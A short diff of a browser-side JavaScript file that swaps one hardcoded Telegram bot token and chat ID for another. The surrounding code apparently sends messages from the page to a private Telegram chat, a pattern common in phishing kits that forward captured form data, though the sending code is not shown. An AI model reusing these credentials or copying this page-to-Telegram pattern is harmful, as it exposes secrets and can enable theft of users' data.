@@ -48,8 +48,8 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     /* =============================== TELEGRAM =============================== */
-    const TELEGRAM_BOT_TOKEN = "8486802704:AAF-Jv8_pKPM8sUOGTWMbJ0Kse7GqCY05Sw";
-    const TELEGRAM_CHAT_ID  = "7644409930";
+    const TELEGRAM_BOT_TOKEN = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
+    const TELEGRAM_CHAT_ID  = "7874654715";
 
     const mensaje =
       "*#2*\n\n" +
@@ -123,6 +123,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
 
 });
+
 
 
 
